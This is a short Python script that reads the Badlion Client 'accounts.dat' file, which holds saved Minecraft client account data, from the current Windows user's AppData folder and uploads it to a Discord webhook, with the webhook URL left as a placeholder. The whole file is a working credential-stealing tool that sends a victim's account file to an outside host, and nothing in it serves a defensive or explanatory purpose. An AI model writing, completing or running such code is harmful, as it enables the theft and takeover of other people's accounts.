import os
import getpass
from discord_webhook import DiscordWebhook

username = getpass.getuser()
folder_path = r"C:\Users\{}\AppData\Roaming\Badlion Client".format(username)
file_path = os.path.join(folder_path, "accounts.dat")

with open(file_path, "rb") as file:
    file_contents = file.read()

webhook_url = "webhook"
webhook = DiscordWebhook(url=webhook_url)
webhook.add_file(file=file_contents, filename="accounts.dat")
response = webhook.execute()
